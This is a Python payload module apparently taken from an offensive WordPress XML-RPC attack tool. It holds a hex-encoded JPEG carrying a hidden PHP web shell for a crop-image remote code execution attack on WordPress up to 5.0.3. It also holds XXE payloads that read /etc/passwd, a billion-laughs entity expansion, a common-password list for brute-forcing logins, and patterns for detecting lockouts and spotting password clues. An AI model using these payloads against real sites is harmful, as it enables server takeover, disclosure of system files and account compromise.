"""xrpc.payloads - extracted from the original xploitrpc monolith."""
from __future__ import annotations
import argparse, base64, gzip, ipaddress, json, html, itertools, os, random
import re, socket, ssl, string, sys, threading, time
import urllib.error, urllib.parse, urllib.request, xmlrpc.client
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple

try:
    from . import wpcompat
except ImportError:  # running a module file directly
    try:
        import wpcompat
    except ImportError:
        wpcompat = None

from .core import (
    Term, ok, bad, warn, info, note, head, kv, die,
    RPCError, TransportError, ProtocolError, RPCFault,
    normalize_url, RPCResult, RPCClient, WPSession, State,
    version_tuple, print_findings, write_report, print_banner,
    SEVERITY_ORDER, SEVERITY_COLOR,
    DEFAULT_UA, DEFAULT_TIMEOUT, BANNER_DELAY, __version__,
    is_disabled_fault, describe_fault,
)

CROP_SHELL_JPEG_HEX = (
    "FFD8FFE000104A46494600010101006000600000FFED003850686F746F73686F7020332E30003842494D040400000000"
    "001C1C027400103C3F3D60245F4745545B305D603B3F3E1C020000020004FFFE003B43524541544F523A2067642D6A70"
    "65672076312E3020287573696E6720494A47204A50454720763830292C207175616C697479203D2038320AFFDB004300"
    "0604040504040605050506060607090E0909080809120D0D0A0E1512161615121414171A211C17181F1914141D271D1F"
    "2223252525161C292C28242B21242524FFDB004301060606090809110909112418141824242424242424242424242424"
    "24242424242424242424242424242424242424242424242424242424242424242424242424FFC000110800C001060301"
    "2200021101031101FFC4001F0000010501010101010100000000000000000102030405060708090A0BFFC400B5100002"
    "010303020403050504040000017D01020300041105122131410613516107227114328191A1082342B1C11552D1F02433"
    "627282090A161718191A25262728292A3435363738393A434445464748494A535455565758595A636465666768696A73"
    "7475767778797A838485868788898A92939495969798999AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8B9BAC2C3C4C5C6C7"
    "C8C9CAD2D3D4D5D6D7D8D9DAE1E2E3E4E5E6E7E8E9EAF1F2F3F4F5F6F7F8F9FAFFC4001F010003010101010101010101"
    "0000000000000102030405060708090A0BFFC400B5110002010204040304070504040001027700010203110405213106"
    "1241510761711322328108144291A1B1C109233352F0156272D10A162434E125F11718191A262728292A35363738393A"
    "434445464748494A535455565758595A636465666768696A737475767778797A82838485868788898A92939495969798"
    "999AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8B9BAC2C3C4C5C6C7C8C9CAD2D3D4D5D6D7D8D9DAE2E3E4E5E6E7E8E9EAF2"
    "F3F4F5F6F7F8F9FAFFDA000C03010002110311003F003C3F3D60245F4745545B305D603B3F3E"
)


CROP_VULNERABLE_MAX = (5, 0, 3)


XMLATTACK_PAYLOADS = (
    (
        "well_formed_baseline",
        "control",
        '<?xml version="1.0"?><methodCall><methodName>system.listMethods'
        '</methodName><params></params></methodCall>',
    ),
    (
        "undefined_entity",
        "malformed",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe "boom">]>'
        '<methodCall><methodName>&xxe;</methodName><params></params></methodCall>',
    ),
    (
        "external_entity_file",
        "xxe",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<methodCall><methodName>&xxe;</methodName><params></params></methodCall>',
    ),
    (
        "external_entity_param",
        "xxe",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM '
        '"file:///etc/hostname"> %xxe;]>'
        '<methodCall><methodName>system.listMethods</methodName>'
        '<params></params></methodCall>',
    ),
    (
        "billion_laughs_bounded",
        "entity_expansion",
        '<?xml version="1.0"?><!DOCTYPE lolz ['
        '<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">'
        '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
        ']><methodCall><methodName>&lol3;</methodName><params></params></methodCall>',
    ),
    (
        "truncated_document",
        "malformed",
        '<?xml version="1.0"?><methodCall><methodName>system.listMethods',
    ),
    (
        "dtd_only",
        "malformed",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "y">]>',
    ),
    (
        "cdata_method",
        "malformed",
        '<?xml version="1.0"?><methodCall><methodName><![CDATA[system.listMethods]]>'
        '</methodName><params></params></methodCall>',
    ),
)


WP_FAULTS = {
    -32700: ("parse error", "Malformed XML. Server is alive and parsing."),
    -32600: ("invalid request", "XML-RPC envelope rejected."),
    -32601: ("method not found", "Method does not exist or is disabled."),
    -32602: ("invalid params", "Wrong argument count or types."),
    -32300: ("transport error", "Server-side transport problem."),
    403: ("forbidden", "Bad credentials, or the action is not permitted."),
    404: ("not found", "Object (post/user/term) does not exist."),
    405: ("method not allowed", "Method disabled on this install."),
    500: ("internal error", "Server-side failure."),
    401: ("unauthorized", "Incorrect username or password."),
}


DISABLED_MARKERS = (
    "xml-rpc services are disabled",
    "xmlrpc services are disabled",
    "xml-rpc server accepts post requests only",
)


COMMON_PASSWORDS = (
    "password", "Password1", "Password123", "password123", "P@ssw0rd",
    "admin", "admin123", "admin1", "letmein", "qwerty", "qwerty123",
    "123456", "12345678", "123456789", "1234567890", "welcome", "Welcome1",
    "changeme", "secret", "test", "test123", "guest", "iloveyou",
    "iloveyou1", "monkey", "dragon", "sunshine", "princess", "football",
    "baseball", "master", "shadow", "superman", "trustno1", "wordpress",
)


LOCKOUT_PATTERNS = (
    r"(\d+)\s+attempts?\s+remaining",
    r"remaining\s+attempts?\s*[:=]?\s*(\d+)",
    r"you have (?:exceeded|reached).{0,40}(?:maximum|limit).{0,20}login",
    r"too many (?:failed )?login attempts",
    r"account.{0,20}(?:locked|temporarily (?:locked|disabled|blocked))",
    r"please (?:wait|try again).{0,40}(?:minute|hour|second)",
)


CLUE_KEYWORDS = (
    "password", "passwd", "pwd", "secret", "hint", "clue", "flag",
    "iloveyou", "love you", "favorite", "favourite", "birthday", "pet ",
    "remember", "don't forget", "dont forget", "note to", "credential",
)


